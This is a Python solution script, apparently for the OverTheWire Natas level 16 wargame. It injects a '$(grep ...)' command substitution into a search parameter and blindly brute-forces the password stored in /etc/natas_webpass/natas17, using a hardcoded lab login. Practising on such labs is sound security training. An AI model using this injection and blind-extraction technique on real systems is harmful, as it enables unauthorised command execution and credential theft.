#!/usr/bin/env python3
import requests
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''
passwd = ''
auth = HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

for char in chars:
    r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=$(grep ' + char + ' /etc/natas_webpass/natas17)', auth=auth)
    if 'doodles' not in r.text :
        print(char)
        filtered = filtered + char
print(filtered)

for i in range(0,32):
    print(i)
    for char in filtered:
        print(char)
        r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=$(grep ^' + passwd + char + ' /etc/natas_webpass/natas17)', auth=auth)
        if 'doodles' not in r.text :
            passwd = passwd + char
            print(passwd)
            break
